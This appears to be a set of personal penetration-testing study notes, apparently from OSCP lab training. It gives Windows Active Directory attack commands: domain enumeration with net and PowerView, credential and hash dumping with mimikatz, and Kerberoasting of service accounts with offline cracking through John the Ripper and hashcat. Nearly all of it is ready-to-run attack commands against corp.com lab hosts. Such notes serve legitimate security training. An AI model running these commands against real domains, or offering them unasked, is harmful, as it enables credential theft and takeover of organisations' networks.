#### Active Directory

```
net user
net user /domain
net user jeff_admin /domain
net group /domain
```

#### LDAP Provider Path Format

```
LDAP://HostName[:PortNumber][/DistinguishedName]

```

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

```


#### Logged on Users

```
Import-Module .\PowerView.ps1

Get-NetLoggedon -ComputerName client251

Get-NetSession -ComputerName dc01

```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1


import-module C:\Tools\active_directory\GetSPN.ps1
Get-SPN -type service -search "*.corp.com*"

https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Get-SPN.ps1


#### Cached creds retrieval

```
mimikatz.exe

privilege::debug

sekurlsa::logonpasswords

sekurlsa::tickets

```

#### Windows system - mimikatz

```
C:\Tools\password_attacks\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam

```

#### Service account attack

Requesting service ticket and display tickets

```
Add-Type -AssemblyName System.IdentityModel 

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'

klist
```

```
kerberos::list /export

```

Cracking the ticket

```
sudo apt update && sudo apt install kerberoast

python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000- Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

https://github.com/nidem/kerberoast

#### Cracking password using JTR

Use the script from repo
https://github.com/nidem/kerberoast


```
john --format=krb5tgs ./crack --wordlist=~/oscp/exer/wordlist.txt

python kirbi2john.py ~/oscp/exer/1-40a10000-offsec@MSSQLSvc~CorpSqlServer.corp.com~1433-CORP.COM.kirbi > crack

```
#### Using Invoke-kerberoast.ps1

```

Import-module Invoke-kerberoast.ps1

Get-DomainSPNTicket -SPN "HTTP/CorpWebServer.corp.com"

Get-Domain -Domain corp.com

Get-DomainUser -SPN

 Get-DomainUser -domain corp.com

Get-DomainUser


Invoke-kerberoast -OutputFormat john

Invoke-kerberoast -OutputFormat hashcat

hashcat -m 13100 -a 0 kerb-hash0.txt ./wordlist.txt --force

Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

```

